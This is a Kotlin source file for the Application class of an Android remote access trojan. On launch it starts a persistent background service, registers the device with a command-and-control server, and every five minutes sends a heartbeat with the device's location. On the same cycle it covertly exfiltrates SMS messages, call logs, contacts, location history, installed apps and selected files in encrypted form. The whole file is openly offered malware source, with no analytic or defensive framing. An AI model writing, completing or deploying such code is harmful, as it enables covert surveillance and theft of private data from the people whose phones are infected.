package com.rat.client

import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.multidex.MultiDex
import com.rat.client.service.RatService
import com.rat.client.util.DeviceUtils
import com.rat.client.util.EncryptionUtils
import com.rat.client.util.PreferencesManager
import com.rat.client.util.SystemUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class RatApplication : Application() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "RatApplication"
        private var instance: RatApplication? = null
        fun getInstance(): RatApplication? = instance
    }

    // Coroutine scope for background operations
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onCreate() {
        super.onCreate()
        instance = this

        // Initialize core utilities
        PreferencesManager.init(this)
        EncryptionUtils.init(this)
        DeviceUtils.init(this)
        SystemUtils.init(this)

        // Start persistent service
        startPersistentService()

        // Schedule periodic tasks
        schedulePeriodicTasks()

        Log.d(TAG, "RAT Application initialized")
    }

    override fun attachBaseContext(base: Context) {
        super.attachBaseContext(base)
        MultiDex.install(this)
    }

    private fun startPersistentService() {
        val intent = Intent(this, RatService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun schedulePeriodicTasks() {
        scope.launch {
            // Initial device registration
            registerDevice()

            // Periodic heartbeat and data exfiltration
            while (true) {
                try {
                    sendHeartbeat()
                    exfiltrateData()
                } catch (e: Exception) {
                    Log.e(TAG, "Periodic task error: ${e.message}")
                }
                kotlinx.coroutines.delay(300000) // 5 minutes
            }
        }
    }

    private fun registerDevice() {
        scope.launch {
            try {
                val deviceInfo = DeviceUtils.collectDeviceInfo(this@RatApplication)
                val encrypted = EncryptionUtils.encrypt(deviceInfo.toJson())
                // Send to C2 - implementation in RatService
                RatService.getInstance()?.sendCommand("register", encrypted)
            } catch (e: Exception) {
                Log.e(TAG, "Registration failed: ${e.message}")
            }
        }
    }

    private fun sendHeartbeat() {
        scope.launch {
            try {
                val heartbeat = mapOf(
                    "timestamp" to System.currentTimeMillis(),
                    "battery" to DeviceUtils.getBatteryLevel(this@RatApplication),
                    "network" to DeviceUtils.getNetworkType(this@RatApplication),
                    "location" to DeviceUtils.getLastKnownLocation(this@RatApplication)?.toJson()
                )
                val encrypted = EncryptionUtils.encrypt(heartbeat.toJson())
                RatService.getInstance()?.sendCommand("heartbeat", encrypted)
            } catch (e: Exception) {
                Log.e(TAG, "Heartbeat failed: ${e.message}")
            }
        }
    }

    private fun exfiltrateData() {
        scope.launch {
            try {
                // Collect and send various data types
                val dataTypes = listOf("sms", "calls", "contacts", "location", "apps", "files")
                dataTypes.forEach { type ->
                    val data = when (type) {
                        "sms" -> DeviceUtils.getSmsData(this@RatApplication)
                        "calls" -> DeviceUtils.getCallLogData(this@RatApplication)
                        "contacts" -> DeviceUtils.getContactsData(this@RatApplication)
                        "location" -> DeviceUtils.getLocationHistory(this@RatApplication)
                        "apps" -> DeviceUtils.getInstalledApps(this@RatApplication)
                        "files" -> DeviceUtils.getInterestingFiles(this@RatApplication)
                        else -> emptyMap()
                    }
                    if (data.isNotEmpty()) {
                        val encrypted = EncryptionUtils.encrypt(data.toJson())
                        RatService.getInstance()?.sendCommand("exfil_$type", encrypted)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Exfiltration failed: ${e.message}")
            }
        }
    }

    override fun onTerminate() {
        scope.coroutineContext.cancel()
        super.onTerminate()
    }
}